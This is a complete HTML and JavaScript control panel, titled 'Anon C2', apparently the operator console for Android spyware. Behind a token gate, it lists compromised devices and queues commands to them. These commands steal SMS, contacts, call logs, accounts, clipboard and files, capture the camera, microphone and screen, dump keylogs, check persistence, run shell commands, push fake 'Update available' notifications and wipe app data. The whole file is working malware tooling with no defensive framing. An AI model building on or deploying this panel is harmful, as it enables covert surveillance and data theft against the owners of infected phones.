<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Anon C2 Panel</title>
<style>
  :root{--bg:#0b0a10;--card:#14121c;--line:#2a2438;--txt:#f2ebff;--mut:#9a90ad;--acc:#a34cff;--ok:#5df18b;--bad:#ff6b8a}
  *{box-sizing:border-box}body{margin:0;font-family:ui-sans-serif,system-ui,sans-serif;background:radial-gradient(ellipse at 50% 0%,#25123b 0%,var(--bg) 55%);color:var(--txt);min-height:100vh}
  header{padding:16px 20px;border-bottom:1px solid var(--line);display:flex;gap:12px;align-items:center;flex-wrap:wrap}
  header h1{font-size:16px;margin:0;letter-spacing:.12em}
  .pill{font-size:11px;border:1px solid var(--acc);color:#e9d4ff;padding:4px 10px;border-radius:999px}
  main{display:grid;grid-template-columns:280px 1fr;gap:0;min-height:calc(100vh - 58px)}
  @media(max-width:900px){main{grid-template-columns:1fr}}
  aside{border-right:1px solid var(--line);padding:16px;background:#0e0c14aa}
  section{padding:16px}
  label{display:block;font-size:11px;color:var(--mut);margin:10px 0 4px}
  input,select,textarea,button{width:100%;border-radius:10px;border:1px solid var(--line);background:#100e18;color:var(--txt);padding:10px 12px;font:inherit}
  textarea{min-height:70px;font-family:ui-monospace,monospace;font-size:12px}
  button{cursor:pointer;background:linear-gradient(90deg,#7b2ed2,#bd70ff);border:0;font-weight:600}
  button.secondary{background:#1a1624;border:1px solid var(--line)}
  button:disabled{opacity:.5;cursor:default}
  .row{display:flex;gap:8px}.row>*{flex:1}
  .list{display:flex;flex-direction:column;gap:8px;max-height:42vh;overflow:auto}
  .dev{padding:10px;border:1px solid var(--line);border-radius:12px;background:var(--card);cursor:pointer}
  .dev.active{border-color:var(--acc);box-shadow:0 0 0 1px var(--acc) inset}
  .dev b{display:block;font-size:13px}
  .dev span{font-size:11px;color:var(--mut)}
  .online{color:var(--ok)}.offline{color:var(--bad)}
  .cmds{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin-top:8px}
  .cmds button{font-size:12px;padding:8px}
  pre{background:#0a0910;border:1px solid var(--line);border-radius:12px;padding:12px;overflow:auto;max-height:48vh;font-size:12px;white-space:pre-wrap}
  .log{font-size:12px;color:var(--mut);margin-top:8px}
  .auth-gate{max-width:360px;margin:10vh auto;padding:24px;border:1px solid var(--line);border-radius:16px;background:var(--card)}
</style>
</head>
<body>
<div id="gate" class="auth-gate">
  <h1 style="margin-top:0">Anon C2</h1>
  <p style="color:var(--mut);font-size:13px">Enter operator token to open the panel.</p>
  <label>Operator token</label>
  <input id="tokenInput" type="password" placeholder="OPERATOR_TOKEN"/>
  <div style="height:12px"></div>
  <button id="unlockBtn">Unlock</button>
  <p id="gateErr" class="log" style="color:var(--bad)"></p>
</div>

<div id="app" hidden>
  <header>
    <h1>ANON C2</h1>
    <span class="pill" id="who">panel</span>
    <span class="pill" id="counts">0 online / 0 users</span>
    <div style="flex:1"></div>
    <button class="secondary" id="refreshBtn" style="width:auto">Refresh</button>
    <button class="secondary" id="logoutBtn" style="width:auto">Lock</button>
  </header>
  <main>
    <aside>
      <div class="row">
        <button id="btnOnline">/online</button>
        <button id="btnUsers" class="secondary">/users</button>
      </div>
      <label>Selected device</label>
      <input id="deviceId" placeholder="device uuid"/>
      <div class="list" id="deviceList"></div>
      <label>Quick args (JSON)</label>
      <textarea id="args">{}</textarea>
      <div style="height:8px"></div>
      <button id="enqueueCustom">Send custom name…</button>
      <input id="customName" placeholder="command name" style="margin-top:8px"/>
    </aside>
    <section>
      <h2 style="margin:0 0 8px;font-size:14px">Commands</h2>
      <div class="cmds" id="cmdGrid"></div>
      <h2 style="margin:18px 0 8px;font-size:14px">Results</h2>
      <pre id="out">Ready.</pre>
      <div class="log" id="status"></div>
    </section>
  </main>
</div>
<script>
const COMMANDS = [
  {name:'info', label:'info'},
  {name:'geoloc', label:'geoloc'},
  {name:'sms', label:'sms', args:{limit:30}},
  {name:'contacts', label:'contacts', args:{limit:100}},
  {name:'clipboard', label:'clipboard'},
  {name:'files', label:'files', args:{path:'/sdcard'}},
  {name:'shell', label:'shell', args:{cmd:'getprop ro.build.version.release'}},
  {name:'cam', label:'cam', args:{facing:'back'}},
  {name:'mic', label:'mic', args:{seconds:8}},
  {name:'screenshot', label:'screenshot'},
  // 10 additional
  {name:'calllog', label:'calllog', args:{limit:50}},
  {name:'accounts', label:'accounts'},
  {name:'apps', label:'apps'},
  {name:'wifi', label:'wifi'},
  {name:'sim', label:'sim'},
  {name:'notifications', label:'notifications'},
  {name:'keylog_dump', label:'keylog_dump'},
  {name:'persist_status', label:'persist_status'},
  {name:'push_text', label:'push_text', args:{title:'System', body:'Update available'}},
  {name:'wipe_app_data', label:'wipe_app_data'},
];

const ONLINE_MS = 45000; // seen within 45s = online
let token = sessionStorage.getItem('op_token') || '';
let devices = [];

const $ = (id) => document.getElementById(id);
function authHeaders() {
  return { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' };
}
function setOut(x) {
  $('out').textContent = typeof x === 'string' ? x : JSON.stringify(x, null, 2);
}
function setStatus(s) { $('status').textContent = s || ''; }

async function api(path, opts={}) {
  const r = await fetch(path, {
    ...opts,
    headers: { ...authHeaders(), ...(opts.headers||{}) },
  });
  const data = await r.json().catch(() => ({}));
  if (!r.ok) throw new Error(data.error || r.statusText);
  return data;
}

function renderDevices(list, mode) {
  devices = list || [];
  const online = devices.filter(d => (Date.now() - (d.lastSeen||0)) < ONLINE_MS);
  $('counts').textContent = online.length + ' online / ' + devices.length + ' users';
  const show = mode === 'online' ? online : devices;
  const box = $('deviceList');
  box.innerHTML = '';
  if (!show.length) {
    box.innerHTML = '<div class="log">No devices</div>';
    return;
  }
  for (const d of show) {
    const isOn = (Date.now() - (d.lastSeen||0)) < ONLINE_MS;
    const el = document.createElement('div');
    el.className = 'dev' + ($('deviceId').value === d.id ? ' active' : '');
    const model = (d.meta && (d.meta.model || d.meta.manufacturer)) || 'device';
    el.innerHTML = '<b>' + model + '</b><span class="' + (isOn?'online':'offline') + '">' +
      (isOn?'online':'offline') + ' · ' + d.id.slice(0,8) + '…</span>';
    el.onclick = () => {
      $('deviceId').value = d.id;
      renderDevices(devices, mode);
    };
    box.appendChild(el);
  }
}

async function loadUsers() {
  setStatus('loading /users…');
  const list = await api('/op/devices');
  renderDevices(list, 'users');
  setOut(list);
  setStatus('users: ' + list.length);
}
async function loadOnline() {
  setStatus('loading /online…');
  const list = await api('/op/devices');
  const online = list.filter(d => (Date.now() - (d.lastSeen||0)) < ONLINE_MS);
  renderDevices(list, 'online');
  setOut(online);
  setStatus('online: ' + online.length);
}

async function enqueue(name, args) {
  const deviceId = $('deviceId').value.trim();
  if (!deviceId) { setStatus('select a device'); return; }
  let parsed = args;
  if (!parsed) {
    try { parsed = JSON.parse($('args').value || '{}'); }
    catch { setStatus('args JSON invalid'); return; }
  }
  setStatus('enqueue ' + name + '…');
  const res = await api('/op/enqueue', {
    method: 'POST',
    body: JSON.stringify({ deviceId, name, args: parsed || {} }),
  });
  setOut(res);
  setStatus('queued ' + name + ' → ' + res.jobId);
  // poll result a few times
  for (let i = 0; i < 8; i++) {
    await new Promise(r => setTimeout(r, 2000));
    try {
      const result = await api('/op/result/' + res.jobId);
      setOut(result);
      setStatus('result for ' + name);
      return;
    } catch (_) {}
  }
  setStatus('queued; result not ready yet — check /op/results');
}

function buildCmds() {
  const g = $('cmdGrid');
  g.innerHTML = '';
  for (const c of COMMANDS) {
    const b = document.createElement('button');
    b.textContent = c.label;
    b.onclick = () => {
      if (c.args) $('args').value = JSON.stringify(c.args, null, 2);
      enqueue(c.name, c.args);
    };
    g.appendChild(b);
  }
}

function unlock() {
  token = $('tokenInput').value.trim();
  if (!token) { $('gateErr').textContent = 'token required'; return; }
  sessionStorage.setItem('op_token', token);
  $('gate').hidden = true;
  $('app').hidden = false;
  buildCmds();
  loadOnline().catch(e => setStatus(String(e)));
}

$('unlockBtn').onclick = unlock;
$('tokenInput').addEventListener('keydown', e => { if (e.key === 'Enter') unlock(); });
$('logoutBtn').onclick = () => { sessionStorage.removeItem('op_token'); location.reload(); };
$('refreshBtn').onclick = () => loadUsers().catch(e => setStatus(String(e)));
$('btnOnline').onclick = () => loadOnline().catch(e => setStatus(String(e)));
$('btnUsers').onclick = () => loadUsers().catch(e => setStatus(String(e)));
$('enqueueCustom').onclick = () => enqueue($('customName').value.trim());

if (token) {
  $('gate').hidden = true;
  $('app').hidden = false;
  buildCmds();
  loadOnline().catch(e => setStatus(String(e)));
}
</script>
</body>
</html>
